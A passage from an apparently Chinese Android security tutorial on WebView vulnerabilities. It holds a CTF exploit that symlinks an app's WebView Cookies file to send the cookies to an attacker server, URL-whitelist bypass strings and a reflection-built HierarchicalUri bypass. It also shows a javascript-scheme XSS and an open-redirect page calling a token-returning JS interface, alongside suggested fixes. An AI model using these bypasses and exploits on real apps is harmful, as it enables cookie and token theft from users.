class="line">    String symlink \= root + <span class="string">&quot;/symlink.html&quot;</span>;</span><br><span class="line">    String cookies \= getPackageManager().getApplicationInfo(<span class="string">&quot;com.bytectf.easydroid&quot;</span>, <span class="number">0</span>).dataDir + <span class="string">&quot;/app_webview/Cookies&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;rm &quot;</span> + symlink).waitFor();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;ln -s &quot;</span> + cookies + <span class="string">&quot; &quot;</span> + symlink).waitFor();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;chmod -R 777 &quot;</span> + root).waitFor();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> symlink;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(th);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过Intent重定向，首先加载exp.html来设置cookie，然后再加载symlink.html，将所要Cookies内容返回给我们的服务器。最终达到窃取Cookies的目的。注意，这里要保证setAllowFileAccess(true)，API 29以下默认为true，否则会利用失败</p>
<p>效果显示：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/75.png" alt="image-20220730141455146"></p>
<h3 id="3-URL配置漏洞"><a href="#3-URL配置漏洞" class="headerlink" title="3.URL配置漏洞"></a>3.URL配置漏洞</h3><p>在WebView漏洞中，许多URL可以通过各种方式去绕过验证，从而引起各式各样的漏洞</p>
<p>URL的结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://login:password@address:port/path/to/resource/?query_string#fragment</span><br></pre></td></tr></table></figure>

<ul>
<li>scheme<br>不区分大小写，包括http、https、file、ftp等等,:之后的“&#x2F;&#x2F;”可省略，例如http:<a target="_blank" rel="noopener" href="http://www.qq.com/">www.qq.com</a>, 此外，多数浏览器在scheme之前加空格也是可以正常解析的</li>
<li>login:password@（认证信息）<br>服务器有时候需要用户名和密码认证，ftp协议比较常见，http很少见，但这个不常见字段往往可以绕过很多检查</li>
<li>address<br>address字段可以是一个不区分大小写的域名、一个ipv4地址或带方括号的ipv6地址，部分浏览器接收ip地址的八进制、十进制、十六进制等写法</li>
<li>port<br>端口号</li>
<li>&#x2F;path&#x2F;to&#x2F;resource<br>层级路径，可以使用“..&#x2F;”到上一级目录</li>
<li>query_string<br>查询字符串，格式为”query_string?name1&#x3D;value1&amp;name2&#x3D;value2”</li>
<li>fragment<br>用于html中的页面定位</li>
</ul>
<h4 id="（1）URL绕过漏洞"><a href="#（1）URL绕过漏洞" class="headerlink" title="（1）URL绕过漏洞"></a>（1）URL绕过漏洞</h4><p><strong>漏洞原理：</strong></p>
<h5 id="lt-1-gt-通用的URL绕过"><a href="#lt-1-gt-通用的URL绕过" class="headerlink" title="&lt;1&gt;通用的URL绕过"></a>&lt;1&gt;通用的URL绕过</h5><p>首先我们来看一个简单的url校验例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(checkDomain(url))&#123;</span><br><span class="line">	enableJavaScriptInterface();</span><br><span class="line">	<span class="comment">//或者webview.load(url)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是对url进行域名校验，然后开启我们的<code>enableJavaScriptInterface</code>接口可以访问js文件</p>
<p>我们在实际中会发现这样的例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(url.startsWith(<span class="string">&quot;file://&quot;</span>))&#123;</span><br><span class="line">	setJavaScriptEnbled(<span class="literal">false</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	setJavaScriptEnbled(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显这里是开发者为了防止加载file的同源策略进行的防护，但是我们有很多的绕过方法：</p>
<p>总结：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) 大写字母 “File:<span class="comment">//”</span></span><br><span class="line">(<span class="number">2</span>) 前面加上空格： “ file:<span class="comment">//”</span></span><br><span class="line">(<span class="number">3</span>) 字符编码：“file：%<span class="number">2F</span>/”</span><br><span class="line">(<span class="number">4</span>) 可正常访问的畸形路径：“file:sdcard/attack/html” 或 “file:/\<span class="comment">//sdcard/attack.html”</span></span><br></pre></td></tr></table></figure>

<h5 id="lt-2-gt-常见的url校验"><a href="#lt-2-gt-常见的url校验" class="headerlink" title="&lt;2&gt; 常见的url校验"></a>&lt;2&gt; 常见的url校验</h5><p>我们还可以发现在一般的url中会对首尾进行校验</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(host.endsWith(<span class="string">&quot;mysite.com&quot;</span>))&#123;</span><br><span class="line">	enableJavascriptInterface();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在问题：endWith未闭合点号</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绕过：evilmysite.com</span><br><span class="line">修复：endsWith(<span class="string">&quot;.mysite.com&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>使⽤startsWith、contains、indexOf、正则匹配等⾮严格字符串匹配</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(host.startsWith(<span class="string">&quot;mysite.com&quot;</span>))&#123;</span><br><span class="line">	enableJavascriptInterface();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">绕过：mysite.com@oppo.com</span><br></pre></td></tr></table></figure>

<p><strong>contains+indexOf绕过：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">任何可以添加字符串的字段</span><br><span class="line">子域名 huawei.com.mysite.com</span><br><span class="line">子路径 mysite.com/huawei.com</span><br><span class="line">参数 mysite.com/xxxx#huawei.com</span><br></pre></td></tr></table></figure>

<p><strong>&#x2F;&#x2F;和第一个&#x2F;之间提取host</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span></span><br><span class="line">&#123;</span><br><span class="line">    String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;huawei.com&quot;</span>,<span class="string">&quot;hicloud.com&quot;</span>&#125;;</span><br><span class="line">    String tempStr=inputUrl.replace(<span class="string">&quot;://&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    String inputDomain=tempStr.substring(<span class="number">0</span>,tempStr.indexOf(<span class="string">&quot;/&quot;</span>)); <span class="comment">//提取host</span></span><br><span class="line">    <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputDomain.indexOf(whiteDomain)&gt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>绕过方式：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">子域名 huawei.com.mysite.com</span><br><span class="line">http:<span class="comment">//huawei.com@www.rebeyond.net/poc.htm</span></span><br><span class="line">http:<span class="comment">//a:a@www.huawei.com:b@www.baidu.com 在android中使用getHost获取到的是huawei.com,但实际访问的是baidu.com</span></span><br></pre></td></tr></table></figure>

<p><strong>漏洞复现：</strong></p>
<p>我们打开一个样本APP，分析其代码块：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/45.png" alt="image-20220729211137555"></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/46.png" alt="image-20220729211156801"></p>
<p>这里我们可以简单的发现代码对URL的相应部分进行了校验，这样我们就可以进行构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;insecureshop://com.insecureshop/web?url=https://www.baidu.com&quot;</span><br><span class="line">&quot;insecureshop://com.insecureshop/webview?url=http://www.baidu.com?-insecureshopapp.com&quot;</span><br></pre></td></tr></table></figure>

<p>我们构造了两条URL，然后可以绕过检验，然后我们直接启动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -W -a android.intent.action.VIEW -d URI的值</span><br></pre></td></tr></table></figure>

<p>效果如下：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/47.png" alt="image-20220729211417226"></p>
<p>这里我们可以实现任意的URI的访问和跳转</p>
<h4 id="（2）hearachical-Uri绕过"><a href="#（2）hearachical-Uri绕过" class="headerlink" title="（2）hearachical Uri绕过"></a>（2）hearachical Uri绕过</h4><p>假设我们加载的Uri不是通过Uri.parse，而是通过外部直接获取，我们可以构造hearachical  来绕过</p>
<p>我们可以使用 HierarchicalUri 和 Java Reflection API 进行攻击，同样我们分析一个样本的URL验证</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">   <span class="type">boolean</span> <span class="variable">isValidUrl</span> <span class="operator">=</span> <span class="string">&quot;https&quot;</span>.equals(uri.getScheme()) &amp;&amp; uri.getUserInfo() == <span class="literal">null</span> &amp;&amp; <span class="string">&quot;legitimate.com&quot;</span>.equals(uri.getHost());</span><br><span class="line">   <span class="keyword">if</span> (isValidUrl) &#123;</span><br><span class="line">       webView.loadUrl(uri.toString(), getAuthHeaders());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>android.net.Uri</code>在Android上被广泛使用，但实际上它是一个抽象类。<code>android.net.Uri$HierarchicalUri</code>是它的子类之一。Java 反射 API 使创建能够绕过此检查的 Uri 成为可能。</p>
<p>通过反射传⼊⼀个scheme、authoritiy和path，构造⼀个形式为<a target="_blank" rel="noopener" href="http://legitimate.com@attacker.com的hierachicaluri实例即可绕过/">http://legitimate.com@attacker.com的HierachicalUri实例即可绕过</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">            Uri uri;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//java反射获取类引用</span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">partClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">partConstructor</span> <span class="operator">=</span> partClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                partConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Class</span> <span class="variable">pathPartClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">pathPartConstructor</span> <span class="operator">=</span> pathPartClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                pathPartConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Class</span> <span class="variable">hierarchicalUriClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">hierarchicalUriConstructor</span> <span class="operator">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                hierarchicalUriConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">			   </span><br><span class="line">                <span class="comment">//构造HierachicalUri实例</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(<span class="string">&quot;legitimate.com&quot;</span>, <span class="string">&quot;legitimate.com&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(<span class="string">&quot;@attacker.com&quot;</span>, <span class="string">&quot;@attacker.com&quot;</span>);</span><br><span class="line">                uri = (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;https&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setData(uri);</span><br><span class="line">            intent.setClass(<span class="built_in">this</span>, TestActivity.class);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>文件<code>TestActivity.java</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">         <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">         <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">         <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> intent.getData();</span><br><span class="line"></span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>然后可以获得日志信息：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/48.png" alt="image-20220729212609157"></p>
<p>漏洞防护：</p>
<p>我们只需要让攻击的应用程序获取<code>Uri</code>攻击者控制的对象并专门使用该对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uri uri = Uri.parse(intent.getData().toString());</span><br></pre></td></tr></table></figure>

<p>从 API 级别 28 (Android 9) 开始，<a target="_blank" rel="noopener" href="https://developer.android.com/guide/app-compatibility/restrictions-non-sdk-interfaces">禁止</a>使用内部接口——但这可以通过使用<a target="_blank" rel="noopener" href="https://github.com/ChickenHook/RestrictionBypass">RestrictionBypass</a>等工具轻松绕过</p>
<h4 id="（3）URL-Scheme绕过"><a href="#（3）URL-Scheme绕过" class="headerlink" title="（3）URL Scheme绕过"></a>（3）URL Scheme绕过</h4><p><strong>漏洞原理：</strong></p>
<p>代码在进行URL校验是，检查了host，但是并未检查scheme，这样我们可以通过“javascript”进行绕过</p>
<p>例如：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/69.png" alt="image-20220730132455921"></p>
<p>也可以通过<code>file://www.mysite.com/sdcard/evil.html</code>绕过，某些版本WebView可正常解析为<code>file:///sdcard/evil.html</code></p>
<p><strong>漏洞复现：</strong></p>
<p>我们打开一个样本：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/70.png" alt="image-20220730132644522"></p>
<p>然后进行构造html</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/71.png" alt="image-20220730132704180"></p>
<p>最后就绕过了校验，实现了XSS注入</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/72.png" alt="image-20220730132735229"></p>
<p><strong>安全防护：</strong></p>
<p>URL校验函数</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/73.png" alt="image-20220730132918854"></p>
<p>Intent Scheme校验建议写法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="comment">//解析Intent Scheme URL</span></span><br><span class="line"><span class="number">2.</span> <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> Intent.parseUri(uri， flags);</span><br><span class="line"><span class="number">3.</span><span class="comment">//禁止打开没有BROWSABLE标签的Activity</span></span><br><span class="line"><span class="number">4.</span> intent.addCategory ( <span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> );</span><br><span class="line"><span class="number">5.</span><span class="comment">//禁止设置intent的组件</span></span><br><span class="line"><span class="number">6.</span> intent.setComponent( nu1l);</span><br><span class="line"><span class="number">7.</span><span class="comment">//禁止设置intent的selector</span></span><br><span class="line"><span class="number">8.</span> intent.setSelector(nul1);</span><br><span class="line"><span class="number">9.</span><span class="comment">//打开intent指向的activity</span></span><br><span class="line"><span class="number">10.</span>context.startActivityIfNeeded(intent，-<span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<h4 id="（4）服务端跳转漏洞绕过"><a href="#（4）服务端跳转漏洞绕过" class="headerlink" title="（4）服务端跳转漏洞绕过"></a>（4）服务端跳转漏洞绕过</h4><p><strong>漏洞原理：</strong></p>
<p>⽩名单域名内的服务端出现跳转漏洞时，仍然可以通过检查，并调⽤<code>javascriptInterface</code>，例如我们构造一个这样的URL:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.site1.com/redirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>前面的<code>https://www.site1.com/redirect.php</code>是我们构造的虚拟的站点，当主机访问时，打开这个URL后，服务器会返回一个302响应，然后浏览器侧会斩词请求Location中指定的URL，对于具有单点登录功能的网站，这种类型的接口很常见。</p>
<p>然后我们就可以构造URL来绕过域名白名单：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.site1.com/redirect.php?url=http://223.****.32:8080/poc.htm</span><br></pre></td></tr></table></figure>

<p><strong>漏洞复现：</strong></p>
<p>首先我们编写攻击的htm：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">myObj</span>.<span class="title function_">getToken</span>());</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们使用文件服务器来进行模拟</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/49.png" alt="image-20220730114753663"></p>
<p>我们接着编写测试样本代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLWebView</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getToken</span><span class="params">()</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am in getToken&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;token\&quot;:\&quot;1234567890abcdefg\&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_url_web_view);</span><br><span class="line"></span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview4);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>());</span><br><span class="line">        webView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>());</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(),<span class="string">&quot;myObj&quot;</span>);</span><br><span class="line">        String inputUrl=<span class="string">&quot;https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm&quot;</span>; <span class="comment">//ip地址自己写自己的</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkDomain(inputUrl))</span><br><span class="line">            &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am a white domain&quot;</span>);</span><br><span class="line">                <span class="comment">//webView.loadUrl(inputUrl);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span> <span class="keyword">throws</span>  URISyntaxException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!inputUrl.startsWith(<span class="string">&quot;http://&quot;</span>)&amp;&amp;!inputUrl.startsWith(<span class="string">&quot;https://&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;site1.com&quot;</span>,<span class="string">&quot;site2.com&quot;</span>&#125;;</span><br><span class="line">        java.net.URI url=<span class="keyword">new</span> <span class="title class_">java</span>.net.URI(inputUrl);</span><br><span class="line">        String inputDomain=url.getHost(); <span class="comment">//提取host</span></span><br><span class="line">        <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (inputDomain.endsWith(<span class="string">&quot;.&quot;</span>+whiteDomain)) <span class="comment">//www.site1.com      app.site2.com</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里我们可以分析代码中有一个白名单的域名检测函数<code>checkDomain</code>,但是我们可以通过构造URL来绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm</span><br></pre></td></tr></table></figure>

<p>然后我们启动应用：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/50.png" alt="image-20220730115108664"></p>
<p>我们点击白名单绕过按钮：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/51.png" alt="image-20220730115207759"></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/52.png" alt="image-20220730122859092"></p>
<p>我们可以发现这里就成功的绕过了白名单进行跳转</p>
<p><strong>安全防护：</strong></p>
<p>此时可以在<code>shouldOverrideUrlLoading</code>函数中拦截跳转，并对跳转的Url进行检查</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span>(chechDomain(request.getUrl().toString()))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//通过检查，允许跳转</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//未通过检查，允许跳转</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而很多使用<code>shouldOverrideUrlLoading</code>,也是不安全的使用状态，这样还是会存在一些攻击，具体参考：<a target="_blank" rel="noopener" href="https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview"><strong>Android：访问受应用程序保护的组件</strong></a></p>
